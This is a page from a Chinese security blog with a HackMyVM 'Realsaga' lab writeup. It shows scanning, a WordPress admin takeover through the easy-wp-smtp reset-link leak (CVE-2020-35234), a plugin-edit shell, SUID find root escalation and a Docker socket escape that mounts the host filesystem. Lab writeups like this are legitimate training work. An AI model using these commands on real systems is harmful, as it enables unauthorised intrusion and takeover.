<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/9l9AOiqdXO2E7wH_pZp9y/_buildManifest.js" defer=""></script><script src="/_next/static/9l9AOiqdXO2E7wH_pZp9y/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2026<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMRealsaga","contentHtml":"\u003ch1\u003eRealsaga.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Realsaga\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Realsaga\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003cp\u003e端口扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Realsaga nmap -sP 192.168.56.0/24   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 15:42 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.000091s latency).\nMAC Address: 0A:00:27:00:00:05 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.100\nHost is up (0.000047s latency).\nMAC Address: 08:00:27:41:E9:5B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.107\nHost is up (0.00017s latency).\nMAC Address: 08:00:27:ED:38:EC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.102\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (4 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 1.80 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Realsaga nmap -p- -n -Pn -sV 192.168.56.107 -min-rate 10000\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 15:43 CST\nStats: 0:01:55 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 50.00% \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e; ETC: 15:46 (0:01:54 remaining)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.107\nHost is up (0.000060s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n25/tcp open  smtp?\n80/tcp open  http    Apache httpd 2.4.29\nMAC Address: 08:00:27:ED:38:EC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: Host: localhost\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 173.42 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e枚举 \u003ccode\u003eHTTP\u003c/code\u003e 服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Realsaga whatweb http://saga.local    \nhttp://saga.local [200 OK] Apache[2.4.29], Bootstrap[6.1.1], Cookies[_wpas_session], Country[RESERVED][ZZ], Email[info@netwire.loca,info@netwire.local], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.56.107], JQuery[3.2.1], MetaGenerator[Powered by Slider Revolution 6.3.2 - responsive, Mobile-Friendly Slider Plugin \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e WordPress with comfortable drag and drop interface.,Powered by WPBakery Page Builder - drag and drop page builder \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e WordPress.,WordPress 6.1.1], PoweredBy[Slider,WPBakery], Script[text/html,text/javascript], Title[SAGA Helthcare \u0026#x26;#8211; We Take care of your helth!], UncommonHeaders[\u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e], WordPress[6.1.1], Wordpress-Contact-Form[7.5.4.1]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e操作系统/Web服务器\u003c/strong\u003e: Ubuntu Linux 上的 Apache 2.4.29。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCMS (内容管理系统)\u003c/strong\u003e: \u003cstrong\u003eWordPress 6.1.1\u003c/strong\u003e。这是一个相对较新的版本（2022年底发布），但这并不意味着它是安全的，重点应放在插件上。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eIP 地址\u003c/strong\u003e: \u003ccode\u003e192.168.56.107\u003c/code\u003e (这通常是 VirtualBox Host-Only 网络的地址)。\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003e上 wpscan，能扫出来很多漏洞，但是太多了，挑了几个 RCE 的漏洞进行测试，但是资料很少，并且一般是要登录后用于权限提升的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e.... 太长了不放\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e记得群里之前有个老哥打 \u003ccode\u003ewordpress\u003c/code\u003e 用的是 nuclei，并且速度比 \u003ccode\u003ewpscan\u003c/code\u003e 还快，这里也尝试一下\u003c/p\u003e\n\u003cp\u003e扫出来两个漏洞 \u003ccode\u003eCVE-2023-5561\u003c/code\u003e 以及 \u003ccode\u003eCVE-2020-35234\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Realsaga nuclei -target http://saga.local -t ~/Desktop/Tools/nuclei/nuclei-templates-10.3.5/http/cves\n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.6.0\n\n                projectdiscovery.io\n\n[INF] Current nuclei version: v3.6.0 (latest)\n[INF] Current nuclei-templates version: v10.3.5 (latest)\n[INF] New templates added \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e latest release: 57\n[INF] Templates loaded \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e current scan: 3518\n[INF] Executing 3518 signed templates from projectdiscovery/nuclei-templates\n[INF] Targets loaded \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e current scan: 1\n[INF] Templates clustered: 32 (Reduced 24 Requests)\n[INF] Using Interactsh Server: oast.fun\n[CVE-2023-5561] [http] [medium] http://saga.local/?rest_route=/wp/v2/users\u0026#x26;search=@ [route=\u003cspan class=\"hljs-string\"\u003e\"?rest_route=/wp/v2/users\u0026#x26;\"\u003c/span\u003e]\n[CVE-2020-35234] [http] [high] http://saga.local/wp-content/plugins/easy-wp-smtp/\n[INF] Scan completed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 36.863887627s. 2 matches found.\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eCVE-2020-35234\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWordPress 的 easy-wp-smtp 插件 1.4.4 之前的版本存在管理员账户被盗用的风险，该漏洞已于 2020 年 12 月被公开利用。如果攻击者能够访问 \u003ccode\u003ewp-content/plugins/easy-wp-smtp/\u003c/code\u003e 目录，就能找到一个日志文件（例如 #############_debug_log.txt），其中包含所有密码重置链接。攻击者可以请求重置管理员密码，然后利用日志文件中找到的链接进行攻击。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e正好可以进行访问\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e寻找管理员邮箱\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在忘记密码页面测试之后，发现 \u003ccode\u003eadmin@netwire.local\u003c/code\u003e 邮箱是存在的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e刷新日志文件，得到重置密码链接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e重置密码后，可以正常进行登录进入后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e到后台就是标准的后台 \u003ccode\u003eGetShell\u003c/code\u003e 了，写插件弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e这里修改 \u003cstrong\u003eAkismet Anti-Spam\u003c/strong\u003e 插件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e修改上传后，点击启用即可\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e进来后，我们能发现我们在容器里面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@saga:/var/www/html/wp-admin$ ip add\n1: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n4: eth0@if5: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以读 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@saga:/home/dev$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nad7338854b85303c222cbbf3d4290353\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看特殊权限文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@saga:/var/www$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f 2\u003e/dev/null\n/bin/su\n/bin/umount\n/bin/mount\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/find\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/sudo\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到容器 \u003ccode\u003eroot\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@saga:/var/www$ /usr/bin/find . -\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e /bin/bash -p \\; -quit\nbash-4.4# \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=33(www-data) gid=33(www-data) euid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=33(www-data)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以拿到一个假的 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ebash-4.4# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \nGreat Work .... But This Is\u003cspan class=\"hljs-string\"\u003e'nt the REALSAGA Jump In And TryHarder !!!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eDocker 逃逸\u003c/h3\u003e\n\u003cp\u003eDocker 逃逸文章：\u003ca href=\"https://xz.aliyun.com/news/17111\"\u003ehttps://xz.aliyun.com/news/17111\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e手动测试到 Socket 逃逸的时候发现存在 \u003ccode\u003eDocker.saga\u003c/code\u003e ，这里应该挂载在的是\u003ccode\u003edocker.saga\u003c/code\u003e 而不是 \u003ccode\u003edocker.sock\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上 CDK 进行检测，提示存在\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMRealsaga/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接用 CDK 上面的利用会提示未能获取创建容器 ID\u003c/p\u003e\n\u003cp\u003e这里根据上面的文章进行手动利用，并未 Docker 客户端默认只会去连接 \u003ccode\u003e/var/run/docker.sock\u003c/code\u003e。\n既然该靶机将 Socket 文件重命名为了 \u003ccode\u003e/var/run/docker.saga\u003c/code\u003e，你需要显式地告诉 Docker 客户端去连接这个非标准路径\u003c/p\u003e\n\u003cp\u003e开始逃逸\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# docker -H unix:///var/run/docker.saga images\u003c/span\u003e\nREPOSITORY   TAG       IMAGE ID       CREATED         SIZE\nsaga         latest    4bd60acdea69   13 months ago   1.7GB\nubuntu       18.04     f9a80a55f492   2 years ago     63.2MB\n\n\u003cspan class=\"hljs-comment\"\u003e# docker -H unix:///var/run/docker.saga run -it -v /:/tmp ubuntu:18.04 /bin/bash\u003c/span\u003e\nroot@0b00f467a68d:/# \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=0(root) gid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功挂在到宿主机根目录，读 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@0b00f467a68d:/tmp/root# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \n4aa171ec191d90249c0f7d28d8f589cc\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Realsaga","date":"2025-12-16","updated":"2025-12-16","tags":["Linux","CVE-2020-35234","WordPress","Docker"],"categories":"靶机","comments":true,"description":"Realsaga. https://hackmyvm.eu/machines/machine.php?vm=Realsaga Recon 端口扫描 枚举 HTTP 服务 操作系统/Web服务器: Ubuntu Linux 上的 Apache 2.4.29。 CMS (内容管理系统): WordPre..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMRealsaga"},"buildId":"9l9AOiqdXO2E7wH_pZp9y","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>